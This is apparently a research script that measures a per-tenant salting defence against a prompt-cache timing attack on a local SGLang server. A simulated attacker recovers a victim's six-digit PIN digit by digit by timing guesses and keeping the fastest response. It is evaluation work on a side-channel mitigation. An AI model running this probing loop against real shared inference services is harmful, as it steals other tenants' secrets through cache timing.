import requests
import time
import pandas as pd
import numpy as np
import hashlib

API_URL = "http://localhost:30000/generate"
# The exact same shared prefix from your baseline
SHARED_PUBLIC_PREFIX = (
    "You are a customer support assistant for a cloud infrastructure company. "
    "Below is the internal knowledge base context shared across all support sessions. "
    "Use this context to answer user questions about billing, deployment, and account "
    "management. Always be concise and professional. The following section contains "
    "account-specific context for the current session: "
) * 3 

def generate_tenant_salt(tenant_id: str) -> str:
    """Generates a consistent 64-char salt prefix for a tenant."""
    hashed = hashlib.sha256(tenant_id.encode()).hexdigest()
    return f"<|tenant_{hashed[:12]}|>\n"

def send_request(prompt: str):
    start = time.time()
    response = requests.post(API_URL, json={
        "text": prompt,
        "sampling_params": {"max_new_tokens": 5, "temperature": 0}
    })
    latency = (time.time() - start) * 1000 # in ms
    usage = response.json().get("meta_info", {}).get("usage", {})
    cached = usage.get("prompt_tokens_cached", 0) if isinstance(usage, dict) else 0
    return latency, cached

def run_mitigated_attack(trials=30):
    print(f"=== SGLANG MITIGATED ATTACK: PREFIXWALL SALTING ({trials} TRIALS) ===")
    results = []
    
    # 1. Define distinct tenants
    victim_salt = generate_tenant_salt("tenant_victim_001")
    attacker_salt = generate_tenant_salt("tenant_attacker_999")
    
    for trial in range(trials):
        ground_truth_pin = f"{np.random.randint(0, 999999):06d}"
        recovered_pin = ""
        
        print(f"\nTrial {trial+1}/{trials} | Ground Truth: {ground_truth_pin}")
        
        # Victim connects and caches their session
        victim_prompt = victim_salt + SHARED_PUBLIC_PREFIX + f"PIN: {','.join(list(ground_truth_pin))}."
        send_request(victim_prompt) # Warm cache for victim
        
        # Attacker tries to recover digit by digit
        for pos in range(6):
            latencies = {}
            for guess in range(10):
                # Attacker uses THEIR salt, but tries to guess victim's prefix
                guess_str = str(guess)
                padding = "0" * (5 - pos)
                guess_full = recovered_pin + guess_str + padding
                
                attacker_prompt = attacker_salt + SHARED_PUBLIC_PREFIX + f"PIN: {','.join(list(guess_full))}."
                
                lat, cached = send_request(attacker_prompt)
                latencies[guess] = lat
                
                # Small sleep to mimic realistic probing rate
                time.sleep(0.1)
                
            # The attacker picks the guess with the FASTEST latency
            best_guess = min(latencies, key=latencies.get)
            recovered_pin += str(best_guess)
            print(f"  Pos {pos+1}: Guessed {best_guess} (Actual: {ground_truth_pin[pos]})")
            
        success = recovered_pin == ground_truth_pin
        print(f"  Result: Recovered {recovered_pin} -> {'SUCCESS' if success else 'FAILED'}")
        
        results.append({
            "trial": trial,
            "ground_truth_pin": ground_truth_pin,
            "recovered_pin": recovered_pin,
            "full_match": int(success)
        })
        
    df = pd.DataFrame(results)
    df.to_csv("results/sglang/pin_chained_recovery_mitigated.csv", index=False)
    accuracy = df['full_match'].mean() * 100
    print(f"\n=== FINAL RESULTS ===")
    print(f"Mitigated Attack Accuracy: {accuracy:.2f}% (Baseline was 100%)")
    print(f"Data saved to: results/sglang/pin_chained_recovery_mitigated.csv")

if __name__ == "__main__":
    run_mitigated_attack(trials=30)
